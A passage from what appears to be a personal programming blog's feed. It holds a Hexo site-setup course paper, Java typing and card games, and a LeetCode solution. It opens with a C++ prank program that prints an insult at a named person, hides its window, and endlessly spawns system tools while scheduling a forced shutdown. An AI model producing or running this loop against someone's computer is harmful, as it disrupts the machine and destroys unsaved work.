#include&lt;stdio.h&gt;
#include&lt;cmath&gt;
#include&lt;math.h&gt;
#include&lt;string.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;windows.h&gt;
using namespace std;
int main()
&#123;
	
	int j&#x3D;0;
	
	for(;j&lt;20;j++)
	printf(&quot;刚儿傻逼哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈刚儿傻逼\n&quot;);

	HWND hwnd;
	hwnd&#x3D;FindWindow(&quot;ConsoleWindowClass&quot;,NULL);	
	if(hwnd)
	&#123;
		ShowWindow(hwnd,SW_HIDE);&#x2F;&#x2F;设置指定窗口的显示状态
	&#125;
	int i&#x3D;1;
	for(;1;)
	&#123;
		
		system(&quot;start 　Shutdown -s -t 600&quot;);
		system( &quot;start calc&quot;);
		system( &quot;start certmgr.msc&quot;);
		system( &quot;start charmap&quot;);
		system( &quot;start notepad&quot;);
		system( &quot;start cleanmgr&quot;);
		system( &quot;start cmstp&quot;);
		system( &quot;start cmd.exe&quot;);
		system( &quot;start colorcpl&quot;);
		system( &quot;start CompMgmtLauncher&quot;);
		system( &quot;start compmgmt.msc&quot;);
		system( &quot;start comexp.msc&quot;);
		system( &quot;start dcomcnfg&quot;);
		system( &quot;start control&quot;);
		system( &quot;start devmgmt.msc&quot;);
		system( &quot;start diskmgmt.msc&quot;);
		system( &quot;start notepad&quot;);
	&#125;
    return 0;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>计算机网络课程设计论文</title>
    <url>/2021/01/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E8%AE%BA%E6%96%87/</url>
    <content><![CDATA[<p>网站的初步搭建与应用</p>
<a id="more"></a>
<p>罗宏亮  </p>
<p>摘  要        我们的生活时时刻刻都与网络相连，多设别的互通、同步一直都是各大公司前进的方向之一，苹果公司的iCloud发布于2009年，迈出了Mac，iPad，iPhone同步的重要一步，其他公司陆续推出了各设备的同步方法，其中最主要的方式之一就是网页同步。谁不想要一个自己的网站，申请多个域名，自己运营，自己管理，发自己喜欢的文章，记录自己的学习历程。不仅如此，你可以在电脑上阅读自己收集的资料，如果你要出门，还可以在路上，用手机完成剩下的阅读。如果喜欢，还可以与朋友分享知识，写下各种评论，如果有所更新，还可以及时修改，这就是网站的建立。</p>
<p>关键词    github , node.js , npm , hexo,网站，域名，同步，分享，评论 </p>
<p>1.背景介绍<br>搭建效果：<br><a href="https://lhl11.gitee.io/">https://lhl11.gitee.io/</a><br><a href="https://lhl1.github.io/">https://lhl1.github.io/</a><br>（1）github.io是基于github的repo管理，这意味着咱们对其是有觉得的控制，这个跟放在第三方的平台比，可控性要好太多。下面咱们将详细讲述如何基于github.io打造属于自己的博客网站，gitee.io同理<br>（2）Hexo是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题。由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以hexo所做的就是将这些md文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。<br>（3）脚本语言需要一个解析器才能运行，JavaScript是脚本语言，在不同的位置有不一样的解析器，如写入html的js语言，浏览器是它的解析器角色。而对于需要独立运行的JS，nodejs就是一个解析器。<br>（4）git是一个分布式版本控制软件，最初由林纳斯·托瓦兹创作，于2005年以GPL发布。最初目的是为更好地管理Linux内核开发而设计。应注意的是，这与类似Norton Commander界面的文件管理器不同。<br>1.1  准备工作<br>（1）安装 Node js<br>（2）安装 Hexo<br>（3）安装git<br>（4）注册github，gitee账号</p>
<p>2.网站搭建<br>2.1 环境配置<br>（1）安装cnpm 管理器<br>（2）hexo 的初始化<br>（3）安装cnpm 管理器<br>cnpm install –save hexo-deployer-git #在blog目录下安装git部署插件</p>
<p>npm install -g cnpm –registry=<a href="http://registry.npm.taobao.org/">http://registry.npm.taobao.org</a>   cnpm 管理器</p>
<p>2.2创建仓库<br>（1）首页必须要有Github的账号<br>（2）登录github上，创建一个回购，存放我们的项目文件<br>（3）填写仓库的属性，如下:(注意：这个仓库名比较特殊，取名格式为userName.github.io，用户名为github的用户名）<br>（4）gitee账号创建仓库同理</p>
<p>2.3 配置_config.yml<br>（1）ssh key配置<br>https 和 SSH 的区别：<br>1、前者可以随意克隆github上的项目，而不管是谁的；而后者则是你必须是你要克隆的项目的拥有者或管理员，且需要先添加 SSH key ，否则无法克隆。<br>2、https url 在push的时候是需要验证用户名和密码的；而 SSH 在push的时候，是不需要输入用户名的，如果配置SSH key的时候设置了密码，则需要输入密码的，否则直接是不需要输入密码的。<br>（2）配置_config.yml中有关deploy的部分：</p>
<p>2.4 新建md<br>定位到我们的根目录，执行命令：<br>hexo n “文章名” == hexo new “文章名” #新建文章<br>hexo s == hexo server #启动服务预览</p>
<p>2.5 部署到Github或Gitee上公开使用<br>输入下列命令：<br>hexo d == hexo deploy#部署</p>
<p>2.6 绑定域名<br>如果没用绑定域名只能枯燥的打全网址，lhl1.github.io回车,lhl11.gitee.io，回车<br>如果绑定了域名就没有这么麻烦，例如我下面申请的域名，就可以直接访问我的网站，这样就方便多了<br>以下域名都有不同的用处：<br>lhl1.tk        lhl1.ml        lhl1.ga             lhl1.cf              lhl1.gq</p>
<p>2.7  Gitee与GitHub网站上传的切换(C语言实现)<br>Github服务器在美国，使用人数最多，国内访问太慢，而且访问可能会出现问题；Gitee则为国内网站，访问速度快，所以每次更新网站都会同时部署在github和gitee上。<br>但同步的地址信息写在_config.yml中，如果同时部署在GitHub和gitee上，就需要修改里面的信息，过于繁琐，所以我写了一个切换yml的程序，原理如同两杯水的交换，需要通过第三者实现，源码都已经发布在github上<br><a href="https://github.com/lhl1/Switch_between-Gitee_and_GitHub_uploads/">https://github.com/lhl1/Switch_between-Gitee_and_GitHub_uploads/</a><br>放在如下目录即可，每次需要用时即可切换</p>
<p>2.8 Window与安卓效果</p>
<p>参 考 文 献<br>[1]徐娅 Git版本控制工具在团队协作项目中的应用 分类号：TP311.52 专题：计算机软件及计算机应用<br>[2] Mariot Tsitoara  Beginning Git and GitHub  DOI:10.1007/978-1-4842-5313-7<br>[3]Marco Tulio Valente   What’s in a GitHub Star? Understanding Starring Practices in a Social Coding Platform   DOI:10.1016/j.jss.2018.09.016<br>[4]Git的安装与调试  赵学作 专题：计算机软件及计算机应用 专题：计算机软件及计算机应用<br>[5]hexojs/hexo    <a href="https://github.com/hexojs/hexo">https://github.com/hexojs/hexo</a><br>[6]liyu1981/template-githubio    <a href="https://github.com/liyu1981/template-githubio">https://github.com/liyu1981/template-githubio</a><br>[7]Switch_between-Gitee_and_GitHub_uploads  LHL  <a href="https://github.com/lhl1/Switch_between-Gitee_and_GitHub_uploads">https://github.com/lhl1/Switch_between-Gitee_and_GitHub_uploads</a><br>[8]LHL’s Network Station    LHL   <a href="https://lhl11.gitee.io/">https://lhl11.gitee.io/</a>   <a href="https://lhl1.github.io/">https://lhl1.github.io/</a>    </p>
]]></content>
  </entry>
  <entry>
    <title>Java 打字竞赛a-z</title>
    <url>/2021/01/06/Java-%E6%89%93%E5%AD%97%E7%AB%9E%E8%B5%9Ba-z/</url>
    <content><![CDATA[<p>Java 打字竞赛a-z</p>
<a id="more"></a>

<p><a href="http://s67.555889.xyz/2021/01/06/ab53874428097acfec351e597fd4f8e7.png">ab53874428097acfec351e597fd4f8e7.png</a></p>
<pre class="line-numbers language-none"><code class="language-none">
import javax.swing.*;
import javax.xml.crypto.Data;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class test extends JFrame implements ActionListener,Runnable
&#123;
    JTextField input;
    Thread get,showtimes;
    JLabel showchar,showscore;
    JLabel showTime;
    JLabel xianshi1,xianshi2;
    Data data1;
    int flagsecond&#x3D;1;
    long secondStart,secondend;
    int score&#x3D;0;
    public test()
    &#123;
        input&#x3D;new JTextField(6);
        get&#x3D; new Thread(this);
        get.setName(&quot;get&quot;);
        showtimes&#x3D;new Thread(this);
        showtimes.setName(&quot;time&quot;);
        showchar&#x3D;new JLabel(&quot;&quot;,JLabel.CENTER);
        showchar.setFont(new Font(&quot;Arial&quot;,Font.BOLD,22));
        showscore&#x3D;new JLabel(&quot;得分：&quot;+score);
        showTime&#x3D;new JLabel(&quot;&quot;);
        xianshi1&#x3D;new JLabel(&quot;显示字母:&quot;);
        xianshi2&#x3D;new JLabel(&quot;请输入显示的字母(回车)&quot;);
        setLayout(new FlowLayout());
        add(xianshi1);
        add(showchar);
        add(xianshi2);
        add(input);
        add(showscore);
        add(showTime);
        input.addActionListener(this);
        setBounds(100,100,400,200);
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        setTitle(&quot;LHL&#39;s Typing contest&quot;);
        setVisible(true);
        get.start();
    &#125;
    @Override
    public void actionPerformed(ActionEvent e)
    &#123;
        if(flagsecond&#x3D;&#x3D;1)
        &#123;
            secondStart&#x3D;System.currentTimeMillis();
            flagsecond&#x3D;0;
        &#125;
        String a&#x3D;showchar.getText().trim();
        String b&#x3D;input.getText().trim();
        if(a.equals(b))
        &#123;
            if(a.equals(&quot;z&quot;))
            &#123;
                secondend&#x3D;System.currentTimeMillis();
                long Timecha&#x3D;secondend-secondStart;
                showTime.setText(&quot;完成！      时间:&quot;+Timecha&#x2F;1000+&quot;.&quot;+Timecha%1000+&quot;秒&quot;);
                invalidate();
            &#125;
            score++;
            showscore.setText(&quot;得分：&quot;+score);
            input.setText(null);
            invalidate();
            get.interrupt();
        &#125;
        else
        &#123;
            showscore.setText(&quot;得分：&quot;+score);
            input.setText(null);
            invalidate();
        &#125;
        if(!a.equals(&quot;z&quot;))
        &#123;
            showTime.setText(&quot;    时间:&quot;+(System.currentTimeMillis()-secondStart)&#x2F;1000+&quot;.&quot;+(System.currentTimeMillis()-secondStart)%1000+&quot;秒&quot;);
            invalidate();
        &#125;
    &#125;

    @Override
    public void run()
    &#123;
            char c&#x3D;&#39;a&#39;;
            while(true)
            &#123;
                showchar.setText(&quot;&quot;+c+&quot;&quot;);
                validate();
                if(c&gt;&#x3D;&#39;z&#39;)
                &#123;
                    break;
                &#125;
                c&#x3D;(char)(c+1);
                try
                &#123;
                    Thread.sleep(20000000);
                &#125; catch (InterruptedException e)
                &#123;

                &#125;
            &#125;
    &#125;
    public static void main(String []args)
    &#123;
        test t1&#x3D;new test();
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>LeetoCode 1. 两数之和</title>
    <url>/2021/01/05/LeetoCode-1-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<p>LeetoCode 1. 两数之和</p>
<a id="more"></a>
<blockquote>
<ol>
<li>两数之和<br>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 的那 两个 整数，并返回它们的数组下标。</li>
</ol>
</blockquote>
<blockquote>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。</p>
</blockquote>
<p>你可以按任意顺序返回答案。</p>
<blockquote>
<p>示例 1：<br>输入：nums = [2,7,11,15], target = 9<br>输出：[0,1]<br>解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。<br>示例 2：</p>
</blockquote>
<blockquote>
<p>输入：nums = [3,2,4], target = 6<br>输出：[1,2]<br>示例 3：</p>
</blockquote>
<p>输入：nums = [3,3], target = 6<br>输出：[0,1]</p>
<blockquote>
<p>提示：<br>2 &lt;= nums.length &lt;= 103<br>-109 &lt;= nums[i] &lt;= 109<br>-109 &lt;= target &lt;= 109<br>只会存在一个有效答案</p>
</blockquote>
<p><strong>暴力法</strong></p>
<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;
		int i,j;
        for(i&#x3D;0;i&lt;nums.size()-1;i++)
		&#123;
			for(j&#x3D;i+1;j&lt;nums.size();j++)
			&#123;
				if(nums[i]+nums[j]&#x3D;&#x3D;target)
					return &#123;i,j&#125;;
			&#125;
		&#125;
		return &#123;i,j&#125;;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Java 发牌</title>
    <url>/2021/01/03/Java-%E5%8F%91%E7%89%8C/</url>
    <content><![CDATA[<p>JAVA 发牌</p>
<a id="more"></a>


<blockquote>
<ul>
<li><a href="https://lhl1.lanzous.com/iP3SMjlfp2h">sy8源码 </a></li>
</ul>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">package pukepai;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class test implements ActionListener
&#123;

    JFrame jf;
    JButton b1;
    JButton b2;
    public  static JButton ButtonPhoto[];
    public class createChuangkou1 extends JInternalFrame
    &#123;
        JLayeredPane jp;
        int n &#x3D; 0;
        dapai da &#x3D; new dapai();
        Toolkit tk &#x3D; Toolkit.getDefaultToolkit();
        &#x2F;&#x2F;工具包
        int w &#x3D; (tk.getScreenSize().width);
        int h &#x3D; (tk.getScreenSize().height);
        JButton chupaiButton;

        int chupaishu &#x3D; 0;
        int tiaoguoshu &#x3D; 0;
        int chupaixuhao[] &#x3D; new int[13];
        int tiaoguopaiBool &#x3D; 0;
        int yitiaoguoshu &#x3D; 0;

        public createChuangkou1(int n)
        &#123;

            super(&quot;Player&quot; + n);
            ButtonPhoto&#x3D;new JButton[13];
            this.n &#x3D; n;
            this.setLayout(null);
            jp &#x3D; this.getLayeredPane();
            Setbg();
            for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
            &#123;
                chupaixuhao[i] &#x3D; -1;
            &#125;
            Setbutton(n);
            chupaiButton &#x3D; new JButton(&quot;To play a card&quot;);
            chupaiButton.setBounds(850, h - 201 - 150 + 200, 200, 50);
            chupaiButton.addActionListener(new ActionListener()
            &#123;
                @Override
                public void actionPerformed(ActionEvent e)
                &#123;
                    for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
                    &#123;
                        if (ButtonPhoto[i].getLocation().y !&#x3D; 729)
                        &#123;
                            ButtonPhoto[i].setLocation(w &#x2F; 2 - 60, 400);

                            chupaixuhao[chupaishu] &#x3D; i;
                            chupaishu++;
                        &#125;

                    &#125;
                &#125;

            &#125;);
            jp.add(chupaiButton, new Integer(-110));
            repaint();
        &#125;

        void Setbg()
        &#123;
            ImageIcon bj &#x3D; new ImageIcon(&quot;img&#x2F;bj.jpg&quot;);
            JLabel jl &#x3D; new JLabel(bj);
            jl.setSize(w, h);
            jp.add(jl, new Integer(-100));
        &#125;
         class WaIt implements Runnable
        &#123;


            public void run()
            &#123;

                for(int i&#x3D;0;i&lt;&#x3D;12;i++)
                &#123;
                    ButtonPhoto[i].setVisible(true);
                    try
                    &#123;
                        Thread.sleep(350);
                    &#125; catch (InterruptedException e)
                    &#123;
                        e.printStackTrace();
                    &#125;
                &#125;


            &#125;
        &#125;
        void Setbutton(int k)
        &#123;
            WaIt wait1&#x3D;new WaIt();
            Thread puk&#x3D;new Thread(wait1);
            String[] WpukePhoto &#x3D; new String[13];
            WpukePhoto &#x3D; da.zuhe();

            ImageIcon PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;fang1.jpg&quot;);
            int pw &#x3D; PukePhoto.getIconWidth();
            int ph &#x3D; PukePhoto.getIconHeight();
            int x1 &#x3D; 70; &#x2F;&#x2F; 表示2个扑克牌按钮叠加在一起的宽度
            int y1 &#x3D; 150; &#x2F;&#x2F; 表示扑克牌按钮底边距离neibuchuangti底边的位置
            int kuan &#x3D; pw - x1;
            int firstPositionx &#x3D; (w - kuan * 13) &#x2F; 2 - 35;
            int firstPositiony &#x3D; (h - ph - y1);

            for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
            &#123;

                if (tiaoguopaiBool !&#x3D; 1)
                &#123;
                    PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;&quot; + WpukePhoto[i]);
                    ButtonPhoto[i] &#x3D; new JButton(PukePhoto);
                    ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony, pw, ph);
                    ButtonPhoto[i].addActionListener(new ActionListener()
                    &#123;
                        @Override
                        public void actionPerformed(ActionEvent e)
                        &#123;
                            JButton bn;
                            bn &#x3D; (JButton) e.getSource();
                            int flag &#x3D; 1;
                            jp.add(chupaiButton, new Integer(10));

                            for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
                            &#123;
                                for (int j &#x3D; 0; j &lt;&#x3D; 12; j++)
                                &#123;
                                    if (i &#x3D;&#x3D; chupaixuhao[j])
                                    &#123;
                                        tiaoguopaiBool &#x3D; 1;
                                        yitiaoguoshu++;
                                    &#125;
                                &#125;
                                if (bn &#x3D;&#x3D; ButtonPhoto[i])
                                &#123;
                                    for (int j &#x3D; 0; j &lt;&#x3D; 12; j++)
                                    &#123;
                                        if (j &#x3D;&#x3D; i)
                                            continue;
                                        if (ButtonPhoto[j].getLocation().y !&#x3D; (h - ph - y1))
                                            ButtonPhoto[j].setBounds(firstPositionx + kuan * j, firstPositiony, pw, ph);
                                    &#125;
                                    if (ButtonPhoto[i].getLocation().y &#x3D;&#x3D; (h - ph - y1))
                                    &#123;
                                        System.out.println(h - ph - y1);
                                        ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony - 30, pw, ph);
                                    &#125;
                                &#125;
                            &#125;
                            repaint();
                        &#125;
                    &#125;);
                    jp.add(ButtonPhoto[i], new Integer(i));
                    ButtonPhoto[i].setVisible(false);
                    WaIt t1&#x3D;new WaIt();
                    Thread thread&#x3D;new Thread(t1);
                    thread.start();
                &#125;

            &#125;
        &#125;



    &#125;
    public class createChuangkou extends JInternalFrame
    &#123;
        JButton[] ButtonPhoto;
        JLayeredPane jp;
        int n &#x3D; 0;
        dapai da &#x3D; new dapai();
        Toolkit tk &#x3D; Toolkit.getDefaultToolkit();
        &#x2F;&#x2F;工具包
        int w &#x3D; (tk.getScreenSize().width) &#x2F; 2;
        int h &#x3D; (tk.getScreenSize().height) &#x2F; 2;
        JButton chupaiButton;

        int chupaishu &#x3D; 0;
        int tiaoguoshu &#x3D; 0;
        int chupaixuhao[] &#x3D; new int[13];
        int tiaoguopaiBool &#x3D; 0;
        int yitiaoguoshu &#x3D; 0;

        public createChuangkou(int n)
        &#123;
            super(&quot;Player&quot; + n);
            this.n &#x3D; n;
            this.setLayout(null);
            jp &#x3D; this.getLayeredPane();
            Setbg();
            Setbutton(n);;
            repaint();
        &#125;

        void Setbg()
        &#123;
            ImageIcon bj &#x3D; new ImageIcon(&quot;img&#x2F;bj.jpg&quot;);
            JLabel jl &#x3D; new JLabel(bj);
            jl.setSize(w, h);
            jp.add(jl, new Integer(-100));
        &#125;
        class WaIt2 implements Runnable
        &#123;


            public void run()
            &#123;

                for(int i&#x3D;0;i&lt;&#x3D;12;i++)
                &#123;
                    ButtonPhoto[i].setVisible(true);
                    try
                    &#123;
                        Thread.sleep(350);
                    &#125; catch (InterruptedException e)
                    &#123;
                        e.printStackTrace();
                    &#125;
                &#125;


            &#125;
        &#125;

        void Setbutton(int k)
        &#123;

            String[] WpukePhoto &#x3D; new String[13];
            WpukePhoto &#x3D; da.zuhe();
            ButtonPhoto &#x3D; new JButton[13];
            ImageIcon PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;fang1.jpg&quot;);
            int pw &#x3D; PukePhoto.getIconWidth();
            int ph &#x3D; PukePhoto.getIconHeight();
            int x1 &#x3D; 70; &#x2F;&#x2F; 表示2个扑克牌按钮叠加在一起的宽度
            int y1 &#x3D; 150; &#x2F;&#x2F; 表示扑克牌按钮底边距离neibuchuangti底边的位置
            int kuan &#x3D; pw - x1;
            int firstPositionx &#x3D; (w - kuan * 13) &#x2F; 2 - 35;
            int firstPositiony &#x3D; (h - ph - y1 + 20);
            for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
            &#123;
                PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;&quot; + WpukePhoto[i]);
                ButtonPhoto[i] &#x3D; new JButton(PukePhoto);
                ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony, pw, ph);
                ButtonPhoto[i].addActionListener(new ActionListener()
                &#123;
                    @Override
                    public void actionPerformed(ActionEvent e)
                    &#123;
                        JButton bn;
                        bn &#x3D; (JButton) e.getSource();
                        int flag &#x3D; 1;
                        jp.add(chupaiButton, new Integer(10));

                        for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
                        &#123;
                            for (int j &#x3D; 0; j &lt;&#x3D; 12; j++)
                            &#123;
                                if (i &#x3D;&#x3D; chupaixuhao[j])
                                &#123;
                                    tiaoguopaiBool &#x3D; 1;
                                    yitiaoguoshu++;
                                &#125;
                            &#125;
                            if (bn &#x3D;&#x3D; ButtonPhoto[i])
                            &#123;
                                for (int j &#x3D; 0; j &lt;&#x3D; 12; j++)
                                &#123;
                                    if (j &#x3D;&#x3D; i)
                                        continue;
                                    if (ButtonPhoto[j].getLocation().y !&#x3D; firstPositiony)
                                    &#123;
                                        System.out.println(ButtonPhoto[j].getLocation().y);
                                        ButtonPhoto[j].setBounds(firstPositionx + kuan * j, firstPositiony, pw, ph);
                                    &#125;

                                &#125;
                                if (ButtonPhoto[i].getLocation().y &#x3D;&#x3D; firstPositiony)
                                &#123;
                                    System.out.println(firstPositiony);
                                    ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony - 30, pw, ph);
                                &#125;


                            &#125;
                        &#125;
                        repaint();
                    &#125;
                &#125;);
                jp.add(ButtonPhoto[i], new Integer(i));
                ButtonPhoto[i].setVisible(false);
                WaIt2 t2&#x3D;new WaIt2();
                Thread thread2&#x3D;new Thread(t2);
                thread2.start();
            &#125;
            chupaiButton &#x3D; new JButton(&quot;To play a card&quot;);
            chupaiButton.setBounds(300, h - 201 - 150 + 200 + 20, 200, 50);
            chupaiButton.addActionListener(new ActionListener()
            &#123;
                @Override
                public void actionPerformed(ActionEvent e)
                &#123;
                    for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
                    &#123;
                        if (ButtonPhoto[i].getLocation().y !&#x3D; 189 + 20)
                        &#123;
                            ButtonPhoto[i].setBounds(w &#x2F; 2 - 60, 10, 134, 201);

                            chupaixuhao[chupaishu] &#x3D; i;
                            chupaishu++;
                        &#125;

                    &#125;
                &#125;

            &#125;);
            jp.add(chupaiButton, new Integer(-110));


        &#125;

    &#125;


    public test()
    &#123;
        dapai da &#x3D; new dapai();
        &#x2F;&#x2F;抽取程序
        Font font &#x3D; new Font(&quot;黑体&quot;, Font.BOLD, 36);
        JFrame jf &#x3D; new JFrame(&quot;LHL&#39;s Java&quot;);
        jf.setLayout(new FlowLayout(FlowLayout.CENTER));
        JButton b1 &#x3D; new JButton(&quot;Play 1&quot;);
        b1.addActionListener(new ActionListener()
                             &#123;
                                 @Override
                                 public void actionPerformed(ActionEvent e)
                                 &#123;
                                     JFrame jf2 &#x3D; new JFrame(&quot;Play1&quot;);

                                     jf2.setLayout(new GridLayout(1, 1));
                                     &#x2F;&#x2F;外窗口
                                     JInternalFrame jif &#x3D; new JInternalFrame();
                                     jif &#x3D; new createChuangkou1(1);
                                     jif.setVisible(true);
                                     jf2.add(jif);
                                     jf2.setExtendedState(JFrame.MAXIMIZED_BOTH);
                                     jf2.setVisible(true);
                                     jf2.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);



                                 &#125;


                             &#125;
        );
        b1.setFont(font);
        jf.add(b1, Component.CENTER_ALIGNMENT);
        JButton b2 &#x3D; new JButton(&quot;Play 4&quot;);
        b2.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                JFrame jf2 &#x3D; new JFrame(&quot;Play2&quot;);

                jf2.setLayout(new GridLayout(2, 2));
                &#x2F;&#x2F;外窗口
                JInternalFrame jif[] &#x3D; new JInternalFrame[4];
                for (int i &#x3D; 0; i &lt;&#x3D; 3; i++)
                &#123;
                    jif[i] &#x3D; new createChuangkou(i + 1);
                    jif[i].setVisible(true);
                    jf2.add(jif[i]);
                &#125;

                jf2.setExtendedState(JFrame.MAXIMIZED_BOTH);
                jf2.setVisible(true);
                jf2.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

            &#125;
        &#125;);
        b2.setFont(font);
        jf.add(b2);

        jf.setBounds(500, 500, 400, 135);
        jf.setVisible(true);
        jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    &#125;

    public static void main(String[] args)
    &#123;
        new test();

    &#125;

    @Override
    public void actionPerformed(ActionEvent e)
    &#123;


    &#125;
&#125;




<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">package pukepai;

public class dapai
&#123;
    public String[] puke1&#x3D;new String[53];
